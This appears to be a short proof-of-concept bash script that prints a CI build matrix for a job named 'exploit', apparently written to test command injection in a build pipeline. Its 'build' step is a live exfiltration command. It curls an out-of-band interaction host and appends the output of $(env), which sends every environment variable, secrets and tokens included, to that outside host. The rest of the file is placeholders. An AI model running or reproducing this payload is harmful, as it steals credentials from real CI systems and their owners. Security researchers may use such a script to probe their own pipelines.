#!/bin/bash

cat <<EOF
[
  {
    "name": "exploit",
    "os": "ubuntu-latest",
    "runs": {
      "prepare": "echo preparing...",
      "pull": "echo pulling...",
      "build": "curl https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/YOUR-ID?\$(env)",
      "history": "echo done",
      "test": "true",
      "images": "true"
    }
  }
]
EOF
